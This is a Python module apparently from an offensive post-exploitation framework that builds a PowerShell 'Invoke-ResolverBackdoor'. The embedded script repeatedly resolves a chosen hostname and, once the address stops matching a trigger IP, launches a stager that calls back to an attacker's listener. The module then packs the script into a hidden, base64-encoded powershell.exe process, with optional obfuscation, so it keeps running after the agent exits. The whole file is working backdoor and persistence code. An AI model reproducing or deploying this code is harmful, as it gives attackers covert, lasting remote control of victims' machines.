import os
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ResolverBackdoor',

            'Author': ['@sixdub'],

            'Description': ('Starts the Resolver Backdoor.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://sixdub.net'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'Output the backdoor to a file instead of tasking to an agent.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hostname' : {
                'Description'   :   'Hostname to routinely check for a trigger.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Trigger' : {
                'Description'   :   'The IP Address that the backdoor is looking for.',
                'Required'      :   True,
                'Value'         :   '127.0.0.1'
            },
            'Timeout' : {
                'Description'   :   'Time (in seconds) to run the backdoor. Defaults to 0 (run forever).',
                'Required'      :   True,
                'Value'         :   '0'
            },
            'Sleep' : {
                'Description'   :   'Time (in seconds) to sleep between checks.',
                'Required'      :   True,
                'Value'         :   '30'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
function Invoke-ResolverBackdoor
{
    param(
        [Parameter(Mandatory=$False,Position=1)]
        [string]$Hostname,
        [Parameter(Mandatory=$False,Position=2)]
        [string]$Trigger="127.0.0.1",
        [Parameter(Mandatory=$False,Position=3)]
        [int] $Timeout=0,
        [Parameter(Mandatory=$False,Position=4)]
        [int] $Sleep=30
    )

    $running=$True
    $match =""
    $starttime = Get-Date
    while($running)
    {
        if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
        {
            $running=$False
        }
        
        try {
            $ips = [System.Net.Dns]::GetHostAddresses($Hostname)
            foreach ($addr in $ips)
            {
                $resolved=$addr.IPAddressToString
                if($resolved -ne $Trigger)
                {
                    $running=$False
                    REPLACE_LAUNCHER
                }
            }
        }
        catch [System.Net.Sockets.SocketException]{

        }
        Start-Sleep -s $Sleep
    }
}
Invoke-ResolverBackdoor"""

        listenerName = self.options['Listener']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:
            # set the listener value for the launcher
            stager = self.mainMenu.stagers.stagers["multi/launcher"]
            stager.options['Listener']['Value'] = listenerName
            stager.options['Base64']['Value'] = "False"

            # and generate the code
            stagerCode = stager.generate()

            if stagerCode == "":
                return ""
            else:
                script = script.replace("REPLACE_LAUNCHER", stagerCode)
                script = script.encode('ascii', 'ignore')
        
        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value']) 

        outFile = self.options['OutFile']['Value']
        if outFile != '':
            # make the base directory if it doesn't exist
            if not os.path.exists(os.path.dirname(outFile)) and os.path.dirname(outFile) != '':
                os.makedirs(os.path.dirname(outFile))

            f = open(outFile, 'w')
            f.write(script)
            f.close()

            print helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile)
            return ""

        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        # transform the backdoor into something launched by powershell.exe
        # so it survives the agent exiting  
        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
        launcher = helpers.powershell_launcher(script, modifiable_launcher) 
        stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
        parts = stagerCode.split(" ")

        # set up the start-process command so no new windows appears
        scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
        if obfuscate:
            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
        return scriptLauncher
